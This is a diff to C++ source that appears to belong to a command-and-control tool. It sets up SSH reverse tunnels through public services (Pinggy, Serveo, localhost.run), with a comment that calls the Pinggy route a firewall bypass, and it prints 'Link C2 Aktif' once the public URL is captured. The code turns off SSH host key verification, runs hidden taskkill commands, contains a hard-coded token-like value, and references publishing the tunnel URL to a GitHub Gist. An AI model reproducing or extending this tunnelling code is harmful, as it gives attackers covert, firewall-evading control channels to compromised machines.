@@ -129,17 +129,19 @@ void StartTunnelAndGetUrl(int port, std::string& public_url, TunnelType type) {
     } else if (type == TunnelType::PINGGY) {
         provider_name = "Pinggy.io";
         std::string token = std::string(PINGGY_TOKEN);
-        std::string ssh_target = "tcp@free.pinggy.io";
-        if (!token.empty() && token != "YOUR_TOKEN") {
+        // Use ssh.pinggy.io on port 443 for FIREWALL BYPASS (TCP Mode)
+        std::string ssh_target = "tcp@ssh.pinggy.io";
+        if (!token.empty() && token != "Dc1t13rYnkF" && token != "YOUR_TOKEN") {
             ssh_target = token + "+" + ssh_target;
         }
-        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ServerAliveInterval=30 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -p 443 -R0:localhost:" + std::to_string(port) + " " + ssh_target + "\"";
+        // PROFESSIONAL FLAGS: -o UserKnownHostsFile=NUL avoids host key prompts completely
+        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ConnectTimeout=10 -o BatchMode=yes -o ServerAliveInterval=10 -o ServerAliveCountMax=3 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -p 443 -R 0:localhost:" + std::to_string(port) + " " + ssh_target + "\"";
     } else if (type == TunnelType::SERVEO) {
         provider_name = "Serveo.net";
-        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ServerAliveInterval=30 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -R 0:localhost:" + std::to_string(port) + " serveo.net\"";
+        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ConnectTimeout=10 -o BatchMode=yes -o ServerAliveInterval=30 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -p 443 -R 0:localhost:" + std::to_string(port) + " serveo.net\"";
     } else if (type == TunnelType::LOCALHOST_RUN) {
         provider_name = "Localhost.run";
-        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ServerAliveInterval=30 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -R 80:localhost:" + std::to_string(port) + " ssh.localhost.run\"";
+        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ConnectTimeout=10 -o BatchMode=yes -o ServerAliveInterval=30 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -R 80:localhost:" + std::to_string(port) + " ssh.localhost.run\"";
     }
 
     // --- SYNCHRONOUS MEMORY-BASED HANDSHAKE ---
@@ -203,18 +205,27 @@ void StartTunnelAndGetUrl(int port, std::string& public_url, TunnelType type) {
                             }
                         }
                     } else if (type == TunnelType::SERVEO || type == TunnelType::LOCALHOST_RUN) {
-                        size_t pos_srveo = capturedOutput.find("Forwarding TCP connections from ");
-                        if (pos_srveo == std::string::npos) pos_srveo = capturedOutput.find("Forwarding SSH traffic from ");
+                        // Robust extraction for SSH-based providers
+                        std::string lowercaseOutput = capturedOutput;
+                        std::transform(lowercaseOutput.begin(), lowercaseOutput.end(), lowercaseOutput.begin(), ::tolower);
                         
-                        size_t pos_lhr = capturedOutput.find(".lhr.life");
+                        size_t pos_srveo = lowercaseOutput.find("forwarding tcp connections from ");
+                        if (pos_srveo == std::string::npos) pos_srveo = lowercaseOutput.find("forwarding ssh traffic from ");
+                        
+                        size_t pos_lhr = lowercaseOutput.find(".lhr.life");
                         
                         if (pos_srveo != std::string::npos) {
-                            size_t start = capturedOutput.find("from ", pos_srveo) + 5;
-                            size_t end = capturedOutput.find_first_of(" \n\r\t", start);
-                            public_url = capturedOutput.substr(start, end - start);
-                            success = true;
+                            size_t fromPos = lowercaseOutput.find("from ", pos_srveo);
+                            if (fromPos != std::string::npos) {
+                                size_t start = fromPos + 5;
+                                size_t end = lowercaseOutput.find_first_of(" \n\r\t", start);
+                                if (end != std::string::npos) {
+                                    public_url = capturedOutput.substr(start, end - start);
+                                    success = true;
+                                }
+                            }
                         } else if (pos_lhr != std::string::npos) {
-                            // Localhost.run cleaner extraction (Skip banner/username)
+                            // Extract domain containing .lhr.life
                             size_t start = capturedOutput.rfind(" ", pos_lhr);
                             if (start == std::string::npos || (pos_lhr - start) > 50) 
                                 start = capturedOutput.rfind("\n", pos_lhr);
@@ -222,13 +233,13 @@ void StartTunnelAndGetUrl(int port, std::string& public_url, TunnelType type) {
                             if (start == std::string::npos) start = 0; else start++;
                             
                             size_t end = capturedOutput.find_first_of(" \n\r\t", pos_lhr);
-                            public_url = capturedOutput.substr(start, end - start);
-                            
-                            // Remove "user" or "tun-" prefix if mistakenly caught
-                            if (public_url.find("user") != std::string::npos) public_url = public_url.substr(4);
-                            if (public_url.find("tun-") != std::string::npos) public_url = public_url.substr(4);
-                            
-                            success = true;
+                            if (end != std::string::npos) {
+                                public_url = capturedOutput.substr(start, end - start);
+                                // Clean common prefixes
+                                if (public_url.find("user") != std::string::npos) public_url = public_url.substr(public_url.find("-") + 1);
+                                if (public_url.find("tun-") != std::string::npos) public_url = public_url.substr(4);
+                                success = true;
+                            }
                         }
                     }
 
@@ -246,6 +257,7 @@ void StartTunnelAndGetUrl(int port, std::string& public_url, TunnelType type) {
                         }
                         
                         global_public_url = public_url;
+                        global_tunnel_pid = pi.dwProcessId; // Track the tunnel process
                         std::cout << " [SIP]" << std::endl;
                         std::cout << SUCCESS_TAG << "Link C2 Aktif: " << CYAN << public_url << RESET << std::endl;
                         
@@ -312,6 +324,17 @@ void UpdateGitHubGist(const std::string& public_url) {
 }
 
 void CleanupSystem() {
+    // 1. Target specifically tracked tunnel PID if available
+    if (global_tunnel_pid != 0) {
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, global_tunnel_pid);
+        if (hProcess != NULL) {
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+            global_tunnel_pid = 0;
+        }
+    }
+
+    // 2. Fallback to generic cleanup for safety
     RunHiddenProcessSync("taskkill /IM " + std::string(LOCALTONET_EXE) + " /F >NUL 2>&1");
     RunHiddenProcessSync("taskkill /IM ssh.exe /F >NUL 2>&1");
     global_public_url = "None";
